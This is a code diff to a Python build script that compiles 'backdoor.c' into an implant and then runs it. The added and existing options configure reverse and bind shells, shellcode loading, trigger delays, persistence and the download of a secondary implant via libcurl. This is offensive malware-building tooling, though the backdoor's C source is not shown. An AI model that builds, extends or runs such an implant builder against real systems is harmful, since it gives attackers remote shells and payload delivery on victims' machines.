@@ -5,7 +5,7 @@ import os
 import subprocess
 import csv
 
-parser = argparse.ArgumentParser("python compiler.py", usage='%(prog)s [-o fileName] [-p listener] [-intfc eth0] [-act SECRET_PORTS] [-key 200,300,400] [-atkSc] [-a x64] [-p linux] [-ip 192.160.1.100] [-revip 192.168.2.132] [-revport 1337] [-strip]')
+parser = argparse.ArgumentParser("python compiler.py", usage='%(prog)s [-o fileName] [-p listener] [-intfc eth0] [-act SECRET_PORTS] [-key 200,300,400] [-atkSc] [-a x64] [-p linux] [-ip 92.160.1.100] [-revip 192.168.2.132] [-revport 1337] [-strip]')
 
 parser.add_argument("-d", "--debug", action="store_true",
                     help="compile with debugging")
@@ -47,10 +47,18 @@ parser.add_argument("-atkSc", "--loadShellcode", action="store_true",
                     help="execute shellcode")
 parser.add_argument("-atkR", "--reverseShell",action="store_true",
                     help="run a reverse shell")
+parser.add_argument("-atkBi", "--bindShell",action="store_true",
+                    help="run a bind shell")
 parser.add_argument("-revip", "--reverseIP",type=str, metavar='',
                     help="reverse shell IP")
 parser.add_argument("-revport", "--reversePort",type=str, metavar='',
                     help="reverse shell Port")
+
+parser.add_argument("-sip", "--sip",type=str,
+                    help="shell address", metavar='', default="unknown")
+parser.add_argument("-sport", "--sport",type=str,
+                    help="shell port", metavar='', default="unknown")
+
 parser.add_argument("-per", "--persistence",type=str, metavar='',
                     help="persistence mechanism (not implemented)")
 parser.add_argument("-notes", "--notes",type=str, metavar='',
@@ -59,87 +67,103 @@ parser.add_argument("-strip", "--strip", action="store_true",
                     help="strip the binary")
 parser.add_argument("-static", "--static", action="store_true",
                     help="statically link the binary")
+parser.add_argument("-secImp", "--secImp", action="store_true",
+                    help="download secondary implant")
 
 args = parser.parse_args()
-print(args)
 
 cmd = ["gcc", "backdoor.c", "-o", args.outputName]
 
 arg = str(args.ipAddress)
 #DEBUG
 if args.debug:
-    cmd.insert(1, "-D DEBUG=1")
+    cmd.insert(2, "-D DEBUG=1")
 #IPADDRESS
 if args.ipAddress != "unknown":
-    cmd.insert(1, "-D IPADDR=\"" + args.ipAddress +"\"")
+    cmd.insert(2, "-D VALID_IP=\"" + args.ipAddress +"\"")
 #DOMAIN
 if args.domain != "unknown":
-    cmd.insert(1, "-D DOMAIN=\"" + args.domain +"\"")
+    cmd.insert(2, "-D DOMAIN=\"" + args.domain +"\"")
 #PLATFORM
 if args.platform != "unknown":
-    cmd.insert(1, "-D PLATFORM=\"" + args.platform +"\"")
+    cmd.insert(2, "-D PLATFORM=\"" + args.platform +"\"")
 #ARCHITECTURE
 if args.architecture != "unknown":
-    cmd.insert(1, "-D ARCH=\"" + args.architecture +"\"")
+    cmd.insert(2, "-D ARCH=\"" + args.architecture +"\"")
 #OS
 if args.os != "unknown":
-    cmd.insert(1, "-D OS=\"" + args.os +"\"")
+    cmd.insert(2, "-D VALID_SYSNAME=\"" + args.os +"\"")
 #VERSION_NUMBER
 if args.versionNumber != "unknown":
-    cmd.insert(1, "-D VERSION_NUM=\"" + args.versionNumber +"\"")
+    cmd.insert(2, "-D VERSION_NUM=\"" + args.versionNumber +"\"")
 #PAYLOAD
 if args.payload != "unknown":
-    cmd.insert(1, "-D PAYLOAD=\"" + args.payload +"\"")
+    cmd.insert(2, "-D PAYLOAD=\"" + args.payload +"\"")
 #INTERFACE
 if args.interface is not None:
-    cmd.insert(1, "-D INTERFACE=\"" + args.interface +"\"")
+    cmd.insert(2, "-D INTERFACE=\"" + args.interface +"\"")
 #ACTIVATE
 if args.activate is not None:
-    cmd.insert(1, "-D ACTIVATE=\"" + args.activate +"\"")
+    cmd.insert(2, "-D ACTIVATE=\"" + args.activate +"\"")
 #SIZE
 if args.size is not None:
-    cmd.insert(1, "-D SIZE=\"" + args.size +"\"")
+    cmd.insert(2, "-D SIZE=\"" + args.size +"\"")
 #TRIGGER
 if args.trigger is not None:
-    cmd.insert(1, "-D TRIGGER=\"" + args.trigger +"\"")
+    cmd.insert(2, "-D TRIGGER=\"" + args.trigger +"\"")
 #DELAY
 if args.timeDelay is not None:
-    cmd.insert(1, "-D TIMEDELAY=\"" + args.timeDelay +"\"")
+    cmd.insert(2, "-D TIMEDELAY=\"" + args.timeDelay +"\"")
 #DATEDELAY
 if args.dateDelay is not None:
-    cmd.insert(1, "-D DATEDELAY=\"" + args.dateDelay +"\"")
+    cmd.insert(2, "-D DATEDELAY=\"" + args.dateDelay +"\"")
 #DOWNLOADURL
 if args.downloadURL is not None:
-    cmd.insert(1, "-D DOWNLOADURL=\"" + args.downloadURL +"\"")
+    cmd.insert(2, "-D DOWNLOADURL=\"" + args.downloadURL +"\"")
 #BANG
 if args.bang:
-    cmd.insert(1, "-D BANG=1")
+    cmd.insert(2, "-D BANG=1")
 #LOADSHELLCODE
 if args.loadShellcode:
-    cmd.insert(1, "-D LOADSHELLCODE=1")
+    cmd.insert(2, "-D LOADSHELLCODE=1")
 #REVERSESHELL
 if args.reverseShell:
-    cmd.insert(1, "-D REVERSESHELL=1")
+    cmd.insert(2, "-D REVERSESHELL=1")
+#BINDSHELL
+if args.bindShell:
+    cmd.insert(2, "-D BINDSHELL=1")
 #REVERSEIP
 if args.reverseIP is not None:
-    cmd.insert(1, "-D REVERSEIP=\"" + args.reverseIP +"\"")
+    cmd.insert(2, "-D REVERSEIP=\"" + args.reverseIP +"\"")
 #REVERSEPORT
 if args.reversePort is not None:
-    cmd.insert(1, "-D REVERSEPORT=\"" + args.reversePort +"\"")
+    cmd.insert(2, "-D REVERSEPORT=\"" + args.reversePort +"\"")
+
+#SHELL IP
+if args.sip != "unknown":
+    cmd.insert(2, "-D S_IP=\"" + args.sip +"\"")
+#SHELL PORT
+if args.sport != "unknown":
+    cmd.insert(2, "-D S_PORT=\"" + args.sport +"\"")
+
 #PERSIST
 if args.persistence is not None:
-    cmd.insert(1, "-D PERSIST=\"" + args.persistence +"\"")
+    cmd.insert(2, "-D PERSIST=\"" + args.persistence +"\"")
 #NOTES
 if args.notes != "No notes":
-    cmd.insert(1, "-D NOTES=\"" + args.notes +"\"")
+    cmd.insert(2, "-D NOTES=\"" + args.notes +"\"")
 #STRIP
 if args.strip:
-    cmd.insert(1, "-D STRIP=1")
+    cmd.insert(2, "-D STRIP=1")
 #STATIC
 if args.static:
-    cmd.insert(1, "-D STATIC=1")
+    cmd.insert(2, "-D STATIC=1")
+#SECONDARYIMPLANT
+if args.secImp:
+    cmd.insert(2, "-lcurl")
+    cmd.insert(2, "-D SECIMP")
 
-
+print(cmd)
 subprocess.run(cmd)
 subprocess.run("./implant")
 
